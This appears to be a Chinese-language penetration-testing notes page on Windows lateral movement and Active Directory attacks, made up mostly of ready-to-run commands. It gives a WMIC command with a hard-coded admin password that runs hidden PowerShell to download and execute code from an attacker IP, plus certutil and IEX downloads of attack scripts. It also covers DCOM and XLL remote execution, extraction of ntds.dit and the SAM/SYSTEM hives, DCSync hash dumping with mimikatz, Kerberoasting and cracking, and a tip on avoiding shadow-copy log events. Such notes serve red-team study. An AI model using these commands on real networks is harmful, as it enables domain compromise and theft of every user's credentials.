<h2 id="Windows-横向移动"><a href="#Windows-横向移动" class="headerlink" title="Windows 横向移动"></a>Windows 横向移动</h2><h3 id="WMIC-2"><a href="#WMIC-2" class="headerlink" title="WMIC"></a>WMIC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /NODE:192.168.93.20 /user:&quot;TEST\administrator&quot; /password:&quot;zxcASDqwe123&quot; PROCESS call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.0.108:8080/a&#x27;))\&quot;&quot;</span><br></pre></td></tr></table></figure>
<h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>工作组:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /shell 192.168.x.x administrator Aatest</span><br></pre></td></tr></table></figure>
<p>域环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /shell 192.168.93.20 TEST\administrator zxcASDqwe123</span><br></pre></td></tr></table></figure>
<h3 id="WMIC事件订阅"><a href="#WMIC事件订阅" class="headerlink" title="WMIC事件订阅"></a>WMIC事件订阅</h3><p>待填坑</p>
<h3 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h3><p>为了发现支持DCOM的应用程序，我们可以使用<code>Win32_DCOMApplication</code>WMI类进行列举：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance -class Win32_DCOMApplication | select appid,name			</span><br></pre></td></tr></table></figure>
<p>根据这个列表，接下来可以实例化每个AppID，并使用 <code>Get-Member</code>cmdlet列出可用的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$obj=[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;FFB8655F-81B9-4fce-B89C-9A6BA76D13E7&quot;))</span><br></pre></td></tr></table></figure>
<p>能用的DOCM</p>
<h4 id="ExecuteShellCommand"><a href="#ExecuteShellCommand" class="headerlink" title="ExecuteShellCommand"></a>ExecuteShellCommand</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;10.0.0.2&quot;))  </span><br><span class="line">$a.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c hostname &amp;gt; c:\fromdcom.txt&quot;,&quot;7&quot;)</span><br></pre></td></tr></table></figure>
<h4 id="Excel-Application"><a href="#Excel-Application" class="headerlink" title="Excel.Application"></a>Excel.Application</h4><h5 id="ExecuteExcel4Macro"><a href="#ExecuteExcel4Macro" class="headerlink" title="ExecuteExcel4Macro"></a>ExecuteExcel4Macro</h5><h5 id="RegisterXLL"><a href="#RegisterXLL" class="headerlink" title="RegisterXLL"></a>RegisterXLL</h5><blockquote>
<p>我们借助Excel实现横向移动的第二种方法是RegisterXLL方法，该方法最早由Ryan Hanson发表。这种方式相对简单，顾名思义，RegisterXLL方法允许我们执行XLL文件。该文件只是xlAutoOpen导出的DLL。但是，这种方法的优势有两个，其一是文件的扩展名并不影响，其二是该方法支持UNC路径，也就是说它不需要托管在我们要进行横向移动的系统上。 要编写这种技术的工具非常简单，只需要几行，就可以创建出Excel COM对象的实例，并调用带单个参数（即XLL文件路径）的RegisterXLL方法：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string XLLPath = &quot;\\\\\\\\fileserver\\\\excel.log&quot;;  </span><br><span class="line">Type ComType = Type.GetTypeFromProgID(&quot;Excel.Application&quot;, REMOTE_HOST);  </span><br><span class="line">object excel = Activator.CreateInstance(ComType);  </span><br><span class="line">excel.GetType().InvokeMember(&quot;RegisterXLL&quot;, BindingFlags.InvokeMethod, null, excel, new object[] &#123; XLLPath &#125;);</span><br></pre></td></tr></table></figure>

<h3 id="Windows提权练习房间"><a href="#Windows提权练习房间" class="headerlink" title="Windows提权练习房间"></a>Windows提权练习房间</h3><a href="%5Bhttps://tryhackme.com/room/hackpark%5D(https://tryhackme.com/room/hackpark)" title="" target="">hackpark</a> <a href="%5Bhttps://tryhackme.com/room/alfred%5D(https://tryhackme.com/room/alfred)" title="" target="">alfred</a> <a href="%5Bhttps://tryhackme.com/room/steelmountain%5D(https://tryhackme.com/room/steelmountain)" title="" target="">steelmountain</a>

<h3 id="横向移动参考文章"><a href="#横向移动参考文章" class="headerlink" title="横向移动参考文章"></a>横向移动参考文章</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/217928#h2-1">Windows横向移动全攻略（二）：DCOM</a></li>
<li><a target="_blank" rel="noopener" href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">Windows Privilege Escalation Methods for Pentesters</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85791">窃取NTLM HASH的多种奇妙方法</a></li>
</ul>
<h3 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h3><ol>
<li>shell_reverse_tcp 和shell&#x2F;reverse_tcp的区别<blockquote>
<p>阶段和非阶段性。shell_reverse_tcp是一次性的把攻击载荷传输到目标机器上面，而shell&#x2F;reverse_tcp则是阶段性的，首先会传输一个较小的主要攻击载荷，再利用这个shell传输剩下的攻击载荷。</p>
</blockquote>
</li>
</ol>
<h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><p><img src="https://images.atsud0.me/images/post/mtrLoXe.png"></p>
<h3 id="Kerberos-是什么"><a href="#Kerberos-是什么" class="headerlink" title="Kerberos 是什么"></a>Kerberos 是什么</h3><blockquote><p>Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。这个词又指麻省理工学院为这个协议开发的一套计算机软件。软件设计上采用客户端&#x2F;服务器结构，并且能够进行相互认证，即客户端和服务器端均可对对方进行身份认证。可以用于防止窃听、防止重放攻击、保护数据完整性等场合，是一种应用对称密钥体制进行密钥管理的系统。Kerberos的扩展产品也使用公开密钥加密方法进行认证。 </p>
<footer><strong>wiki [https://zh.wikipedia.org/wiki/Kerberos](https://zh.wikipedia.org/wiki/Kerberos)</strong></footer></blockquote>

<p>Kerberos是域的默认身份验证服务。通过第三方票证授权和更强的加密，Kerberos比NTLM更加安全。尽管NTLM有很多可供选择的攻击方式，但Kerberos仍然具有一些潜在的漏洞，就像NTLM一样，我们可以利用它来发挥自己的优势。</p>
<h3 id="Kerberos-常用术语"><a href="#Kerberos-常用术语" class="headerlink" title="Kerberos 常用术语"></a>Kerberos 常用术语</h3><ul>
<li>Ticket Granting Ticket (TGT) 票证授予票证，一种身份验证票证，用于向TGS请求服务票证以获取域中的特定资源。</li>
<li>Ticket Granting Service (TGS) 票证授予服务-接受TGT请求并将票证返回到域中的计算机。</li>
<li>Authentication Service (AS) 身份验证服务发出由域中的TGS使用的TGT，以请求访问其他计算机和服务票证。</li>
<li>Key Distribution Center (KDC) 密钥分发中心是用于发行TGT和服务票证的服务，该服务由身份验证服务(AS)和票证授予服务(TGS)组成。</li>
<li>Service Principal Name (SPN) 服务主体名称是为服务实例提供的标识符，以将服务实例与域服务帐户相关联。 Windows要求服务具有域服务帐户，这就是服务需要SPN集的原因。</li>
<li>KDC Long Term Secret Key (KDC LT Key)KDC长期秘密密钥 -KDC密钥基于KRBTGT服务帐户。 它用于加密TGT并签署PAC。</li>
<li>Client Long Term Secret Key (Client LT Key)客户端密钥基于计算机或服务帐户。它用于检查加密的时间戳并加密会话密钥。</li>
<li>Service Long Term Secret Key (Service LT Key)服务密钥基于服务帐户。它用于加密服务票证的服务部分并对PAC签名。</li>
</ul>
<h3 id="Kerberous-身份验证机制-攻击"><a href="#Kerberous-身份验证机制-攻击" class="headerlink" title="Kerberous 身份验证机制 攻击"></a>Kerberous 身份验证机制 攻击</h3><p>理解Kerberous <div class="video-container"><iframe src="https://www.youtube.com/embed/LmbP-XD1SC8" frameborder="0" loading="lazy" allowfullscreen></iframe></div></p>
<p>Kerberous 保护widnows域的看门狗。。</p>
<p>KDC The Kerberos Distribution Center Kerberos密钥分发中心</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T medin -Q   */*</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -OutputFormat hashcat  |fl  </span><br><span class="line">hashcat -m 13100 -a 0 hash.txt wordlist --force</span><br></pre></td></tr></table></figure>
<h3 id="Ntds-dit"><a href="#Ntds-dit" class="headerlink" title="Ntds.dit"></a>Ntds.dit</h3><blockquote>
<p>在域环境中，活动目录是域中提供目录服务的组件，其可以帮助用户快速准确地从目录中找到其所需要的信息。在规模较大的网络中，要把网络中的众多对象，例如计算机、用户、用户组、打印机、共享文件等分门别类、井然有序的存放在一个大仓库中，并做好信息索引，一遍查找、管理和使用这些资源对象。拥有这个层次结构的数据库就是活动目录数据库。</p>
<p>Ntds.dit文件是域环境中域控上会有的一个二进制文件，是主要的活动目录数据库，其文件路径为域控的 %SystemRoot%\ntds\ntds.dit，活动目录始终会访问这个文件，所以文件禁止被读取。Ntds.dit包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息。它包括域中所有用户的密码哈希值，为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p>
<p>而在非域环境也就是在工作组环境中，用户的密码等信息存储在SAM文件，想要破解SAM文件与Ntds.dit文件都需要拥有一个System文件。和SAM文件一样，Ntds.dit是默认被Windows系统锁定的。</p>
</blockquote>
<p>在一般情况下，Ntds.dit是默认被Windows系统锁定的，想要读取该文件就要利用卷影拷贝服务(Volume Shadow Copy Service，VSS)，得到Ntds.dit文件的副本。卷影拷贝服务(VSS)本质上是属于快照技术的一种，主要用于备份和恢复，即使目标文件被处于锁定状态。</p>
<p>其获取Ntds.dit的基本步骤如下：</p>
<ol>
<li>创建目标主机的卷影拷贝（包含Windows上的全部文件）</li>
<li>然后在创建的卷影拷贝中将ntds.dit复制出来</li>
<li>最后将当前创建的卷影拷贝删除</li>
</ol>
<h4 id="提取SAM文件-amp-Ntds-dit文件"><a href="#提取SAM文件-amp-Ntds-dit文件" class="headerlink" title="提取SAM文件&amp;Ntds.dit文件"></a>提取SAM文件&amp;Ntds.dit文件</h4><h5 id="vssadmin"><a href="#vssadmin" class="headerlink" title="vssadmin"></a>vssadmin</h5><p>其适用于：</p>
<ul>
<li>Windows 10</li>
<li>Windows 8.1</li>
<li>Windows Server 2016</li>
<li>Windows Server 2012  R2</li>
<li>Windows Server 2012</li>
<li>Windows Server 2008 R2</li>
<li>Windows Server 2008</li>
</ul>
<p>1.创建一个C盘的卷影拷贝</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=C:</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-20201025143232175.png" alt="image-20201025143232175"></p>
<p>2.然后在创建的卷影拷贝中将ntds.dit复制到C盘中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-20201025143254201.png" alt="image-20201025143254201"></p>
<p>3.最后将刚刚创建的卷影拷贝删除</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>

<h5 id="vssown-vbs"><a href="#vssown-vbs" class="headerlink" title="vssown.vbs"></a>vssown.vbs</h5><p>下载脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.179.1:8000/vssown.vbs</span><br></pre></td></tr></table></figure>
<ol>
<li>创建卷影拷贝</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /start  </span><br><span class="line">cscript vssown.vbs /create c</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-20201101225944092.png" alt="image-20201101225944092"></p>
<ol start="2">
<li>列出卷影</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /list</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-20201101230108859.png" alt="image-20201101230108859"></p>
<ol start="3">
<li>在创建的卷影拷贝中将ntds.dit复制到C盘中：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit C:\ntds3.dit</span><br></pre></td></tr></table></figure>
<p>这里的ID和Device object需要用到。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101230322426.png" alt="image-20201101230322426"></p>
<ol start="4">
<li>删除</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /delete &#123;B2245D4A-134F-4CF1-A864-E11BDC653A5C&#125;</span><br></pre></td></tr></table></figure>
<p>拷贝好后，删除即可。</p>
<h5 id="ntdsuitil"><a href="#ntdsuitil" class="headerlink" title="ntdsuitil"></a>ntdsuitil</h5><p>创建一个镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-20201025203314897.png" alt="image-20201025203314897"></p>
<p>将刚刚创建的镜像挂载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;ID&#125;&quot; quit quit  </span><br><span class="line">ntdsutil snapshot &quot;mount &#123;395cb146-0a0c-4be1-b7f9-3edb684804d7&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-20201025203429940.png" alt="image-20201025203429940"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201025203441323.png" alt="image-20201025203441323"></p>
<p>将镜像里面的ntds.dit复制出来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202010251510_VOLUMEC$\windows\ntds\ntds.dit c:\ntds_2.dit</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-20201025203530071.png" alt="image-20201025203530071"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201025203647522.png" alt="image-20201025203647522"></p>
<p>复制出来后，删除挂载的镜像。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;ID&#125;&quot; &quot;delete &#123;ID&#125;&quot; quit quit  </span><br><span class="line">  </span><br><span class="line">ntdsutil snapshot &quot;mount &#123;395cb146-0a0c-4be1-b7f9-3edb684804d7&#125;&quot; &quot;delete &#123;395cb146-0a0c-4be1-b7f9-3edb684804d7&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-20201025203637300.png" alt="image-20201025203637300"></p>
<h5 id="IFM提取"><a href="#IFM提取" class="headerlink" title="IFM提取"></a>IFM提取</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</span><br></pre></td></tr></table></figure>
<p>执行该命令后，会自动将ntds.dit文件复制到<code>C:\test\Active Directory\ntds.dit</code>，同时会将SYSTEM和SECURITY复制到<code>C:\test\registry</code>目录下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &quot;C:\test\Active Directory\ntds.dit&quot; C:\ntds.dit</span><br></pre></td></tr></table></figure>
<p>拿到ntds.dit后就可以删除test文件夹了</p>
<p><img src="https://images.atsud0.me/images/post/image-20201101231542545.png" alt="image-20201101231542545"></p>
<h5 id="nishang-x2F-Copy-VSS-ps1"><a href="#nishang-x2F-Copy-VSS-ps1" class="headerlink" title="nishang&#x2F;Copy-VSS.ps1"></a>nishang&#x2F;Copy-VSS.ps1</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://xxx.com/nishang/Gather/Copy-VSS</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-20201025213738505.png" alt="image-20201025213738505"></p>
<p>成功执行后，会将SAM、SYSTEM、Ntds.dit文件复制到当前目录。</p>
<h5 id="万能复制-Invoke-NinjaCopy-ps1"><a href="#万能复制-Invoke-NinjaCopy-ps1" class="headerlink" title="万能复制. Invoke-NinjaCopy.ps1"></a>万能复制. Invoke-NinjaCopy.ps1</h5><p>下载脚本然后导入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.179.1:8000/Invoke-NinjaCopy.ps1  </span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-NinjaCopy.ps1  </span><br><span class="line">  </span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Users\Administrator\Documents\ntds.dit&quot;  </span><br><span class="line">  </span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination &quot;C:\Users\Administrator\Documents\system.hive&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-20201025222233610.png" alt="image-20201025222233610"></p>
<p><strong>这种方法没有调用Volume Shadow Copy服务，所以不会产生日志文件7036(卷影拷贝服务进入运行状态的标志)。</strong></p>
<h5 id="注册表导出"><a href="#注册表导出" class="headerlink" title="注册表导出"></a>注册表导出</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save  </span><br><span class="line">reg save HKLM\SAM sam.save  </span><br><span class="line">reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure>
<h5 id="CVE-2021-36934-HiveNightmare"><a href="#CVE-2021-36934-HiveNightmare" class="headerlink" title="CVE-2021-36934 HiveNightmare"></a>CVE-2021-36934 HiveNightmare</h5><p>Github:<a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/HiveNightmare">HiveNightmare</a></p>
<p>相关文章：<a target="_blank" rel="noopener" href="https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5">HiveNightmare aka #SeriousSAM — anybody can read the registry in Windows 10</a></p>
<p>利用条件：</p>
<ol>
<li>拥有一个还原点&#x2F;卷影副本</li>
<li>sam文件普通用户可访问</li>
</ol>
<p><img src="https://images.atsud0.me/images/post/20210802-21:52:04-_r1d5eO_image-20210802215203833_r1d5eO_1627912324403_r1d5eO_image-20210802215203833.png" alt="image-20210802215203833"></p>
<p>当满足利用条件时，执行HiveNightmare.exe，就会在当前文件夹下生成三个文件，分别是system.save、sam.save、security.save。</p>
<p><img src="https://images.atsud0.me/images/post/20210802-22:29:23-_R0xnFw_image-20210802222923221_R0xnFw_1627914563542_R0xnFw_image-20210802222923221.png" alt="image-20210802222923221"></p>
<p>将其下载到本地，使用<code>mimikatz</code>或者是<code>secretdump.py</code>获取hash。</p>
<h4 id="提取HASH"><a href="#提取HASH" class="headerlink" title="提取HASH"></a>提取HASH</h4><h5 id="Esedbexport-amp-ntdsxtract"><a href="#Esedbexport-amp-ntdsxtract" class="headerlink" title="Esedbexport &amp; ntdsxtract"></a>Esedbexport &amp; ntdsxtract</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install autoconf automake autopoint libtool pkg-config     // 安装依赖  </span><br><span class="line">wget https://github.com/libyal/libesedb/releases/download/20200418/libesedb-experimental-20200418.tar.gz  </span><br><span class="line">cd libesedb-experimental-20200418  </span><br><span class="line">./configure  </span><br><span class="line">make &amp;&amp; make install &amp;&amp; ldconfig</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esedbexport -m tables ntds.dit     </span><br></pre></td></tr></table></figure>
<p>使用ntdsxtract导出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dsusers.py &lt;datatable&gt; &lt;link_table&gt; &lt;output_dir&gt; --syshive &lt;systemhive&gt; --passwordhashes &lt;format options&gt;      </span><br><span class="line">// 命令格式python dsusers.py datatable.3 link_table.5 output --syshive system.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee result.txt</span><br></pre></td></tr></table></figure>
<p>从分离出来的表中提取域中计算机信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dscomputers.py datatable.3 computer_output --csvoutfile domain_computers_info.csv</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意，使用Ntdsxtract导出Ntds.dit表中的域散列值，要提供三个文件：即Ntds.dit导出的ntds.dit.export文件夹中的datatable.3、link_table.5这两个表和之前获得的“SYSTEM”文件：</p>
</blockquote>
<h5 id="secretsdump-py"><a href="#secretsdump-py" class="headerlink" title="secretsdump.py"></a>secretsdump.py</h5><p>这个可以将用注册表导出来的三个文件，获取hash。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam /tmp/sam.save -system /tmp/system.save -security /tmp/security.save LOCAL</span><br></pre></td></tr></table></figure>
<p>或者是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -system /tmp/system.save -ntds /tmp/ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
<h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><p>下载地址:<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug  </span><br><span class="line">  </span><br><span class="line">lsadump::dcsync /domain:xxx.com /all /csvlsadump::dcsync /domain:god.org /all /csv</span><br></pre></td></tr></table></figure>
<h5 id="Invoke-DCSync-ps1"><a href="#Invoke-DCSync-ps1" class="headerlink" title="Invoke-DCSync.ps1"></a>Invoke-DCSync.ps1</h5><p>下载地址:<a target="_blank" rel="noopener" href="https://gist.github.com/monoxgas/9d238accd969550136db">Invoke-DCSync.ps1</a></p>
<p>该脚本通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能，并利用dcsync直接读取ntds.dit得到域用户密码散列值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 导入模块  </span><br><span class="line">Import-Module .\Invoke-DCSync.ps1  </span><br><span class="line"></span><br><span class="line"># 导出域内所有用户的hash  </span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize  </span><br><span class="line">  </span><br><span class="line"># 导出域内administrator账户的hash  </span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-20201102164443074.png" alt="image-20201102164443074"></p>
<h3 id="Kerbrute"><a href="#Kerbrute" class="headerlink" title="Kerbrute"></a>Kerbrute</h3><p>Kerbrute是一种流行的枚举工具，通过滥用Kerberos预身份验证来暴力破解和枚举有效的活动目录用户。</p>
<p>通过暴力破解Kerberos预身份验证，将触发帐户登录失败事件，该事件会向蓝队发出红色标志。 通过Kerberos进行暴力破解时，您可以通过仅向KDC发送单个UDP帧来进行暴力破解，从而允许您从单词列表中枚举域中的用户。<a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases">下载链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute userenum --dc domain -d domain User.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200623_092853.jpg"></p>
<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_19/impacket-0.9.19.tar.gz &amp;&amp; tar xzvf impacket-0.9.19.tar.gz &amp;&amp; cd Impacket-0.9.19  </span><br><span class="line">  </span><br><span class="line">pip install .</span><br></pre></td></tr></table></figure>
<blockquote>
<p>代码在&#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/doc/python3-impacket/examples/</span><br></pre></td></tr></table></figure>
<h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>SPN(ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。</p>
<p>SPN分为：</p>
<ol>
<li><p>注册在机器账号下的，此时服务权限为当一个服务的权限为 <code>Local System</code> 或 <code>Network Service</code></p>
</li>
<li><p>注册在AD目录域内用户下的</p>
</li>
</ol>
<p>机器账号是有权限可以手动注册SPN，普通用户是没有权限注册SPN。但是如果在DC上为域账号赋予 “Read servicePrincipalName” 和 “Write serverPrincipalName” 的权限。那么该域用户也是可以注册服务账号</p>
<h4 id="Kerberoasting-攻击"><a href="#Kerberoasting-攻击" class="headerlink" title="Kerberoasting 攻击"></a><strong>Kerberoasting</strong> 攻击</h4><p>域内的任何一台主机用户或普通域用户，都可以通过查询SPN，向域内的所有服务请求TGS，然后进行暴力破解，但是对于破解出的明文，只有域用户的是可以利用的，机器账户的不能用于远程连接，所以我们的关注点主要就在域用户下注册的SPN。</p>
<p>查询SPN账号(powershell)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setspn -Q /</span><br></pre></td></tr></table></figure>
<p>请求SPN</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;Username/Domain&quot;  </span><br></pre></td></tr></table></figure>
<p>之后可以用mimikatz导出票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::list /export</span><br></pre></td></tr></table></figure>
<p>破解票据</p>
<p><a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
